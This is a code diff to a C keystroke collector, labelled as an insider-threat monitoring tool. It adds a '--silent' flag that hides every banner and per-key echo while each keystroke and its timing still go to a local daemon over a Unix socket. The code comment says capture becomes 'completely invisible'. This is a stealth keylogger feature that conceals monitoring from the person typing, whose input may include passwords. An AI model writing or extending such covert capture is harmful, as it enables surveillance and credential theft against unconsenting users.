@@ -87,9 +87,16 @@ int send_event_to_daemon(const KeystrokeEvent *event, const char *sock_path) {
 }
 
 int main(int argc, char *argv[]) {
-    (void)argc;
-    (void)argv;
-    printf("[*] Insider Threat Keystroke Collector initialized.\n");
+    int silent_mode = 0;
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "--silent") == 0 || strcmp(argv[i], "-s") == 0) {
+            silent_mode = 1;
+        }
+    }
+
+    if (!silent_mode) {
+        printf("[*] Insider Threat Keystroke Collector initialized.\n");
+    }
 
     const char *user = getenv("USER");
     if (!user) user = "unknown";
@@ -105,8 +112,10 @@ int main(int argc, char *argv[]) {
 
     long long last_press_ms = 0;
 
-    printf("[+] Monitoring keystrokes for user: %s (IP: %s, Session: %s)\n", user, src_ip, session_id);
-    printf("[+] Interactive mode active. Start typing (Press Ctrl+C to quit):\n\n");
+    if (!silent_mode) {
+        printf("[+] Monitoring keystrokes for user: %s (IP: %s, Session: %s)\n", user, src_ip, session_id);
+        printf("[+] Interactive mode active. Start typing (Press Ctrl+C to quit):\n\n");
+    }
 
     // Configure cbreak mode: read characters immediately without waiting for newline
     if (tcgetattr(STDIN_FILENO, &orig_termios) == 0) {
@@ -136,13 +145,15 @@ int main(int argc, char *argv[]) {
         event.flight_time_ms = flight_time;
         event.key_code = ch;
 
-        // Visual feedback for user
-        if (ch == 10 || ch == 13) {
-            printf("\n[Sensor] <ENTER> (flight: %lld ms) -> telemetry sent\n", flight_time);
-        } else {
-            printf("[Sensor] '%c' (flight: %lld ms) -> telemetry sent\n", (ch >= 32 && ch <= 126) ? ch : '?', flight_time);
+        // Visual feedback only in interactive/debug mode, completely invisible in silent mode
+        if (!silent_mode) {
+            if (ch == 10 || ch == 13) {
+                printf("\n[Sensor] <ENTER> (flight: %lld ms) -> telemetry sent\n", flight_time);
+            } else {
+                printf("[Sensor] '%c' (flight: %lld ms) -> telemetry sent\n", (ch >= 32 && ch <= 126) ? ch : '?', flight_time);
+            }
+            fflush(stdout);
         }
-        fflush(stdout);
 
         // Dispatch via UDP unix domain socket
         send_event_to_daemon(&event, SOCKET_PATH);
